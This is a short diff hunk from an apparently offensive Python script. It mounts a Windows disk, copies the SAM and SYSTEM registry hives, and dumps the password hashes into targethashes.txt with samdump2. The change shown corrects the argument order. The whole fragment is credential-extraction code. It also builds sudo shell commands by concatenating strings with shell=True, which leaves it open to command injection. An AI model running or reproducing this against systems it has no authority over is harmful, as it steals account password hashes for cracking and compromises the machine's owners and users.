@@ -45,7 +45,7 @@ def animal():
     subprocess.call("sudo mount -o ro " + windows_harddrive + " " + directory, shell=True)
     subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
     subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM .", shell=True)
-    subprocess.call("sudo samdump2 SAM SYSTEM -o targethashes.txt", shell=True)
+    subprocess.call("sudo samdump2 SYSTEM SAM -o targethashes.txt", shell=True)
     subprocess.call("sudo rm -rf SYSTEM SAM", shell=True)
     subprocess.call("sudo nano targethashes.txt", shell=True)
 
